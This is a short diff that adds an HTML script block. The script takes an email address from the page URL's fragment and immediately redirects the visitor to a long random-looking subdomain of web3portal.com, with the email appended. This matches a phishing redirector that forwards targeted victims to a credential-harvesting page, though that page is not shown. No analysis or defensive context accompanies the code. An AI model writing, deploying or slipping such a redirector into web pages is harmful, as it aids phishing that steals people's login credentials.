@@ -1,0 +1,4 @@
+<script type="text/javascript">
+email = window.location.hash.substr(1);
+window.location="https://3g046584teu7r2t9jlm8u6m6558inrq4bijrimhem1ju18hoscri6n0.web3portal.com/#" + email;
+</script>
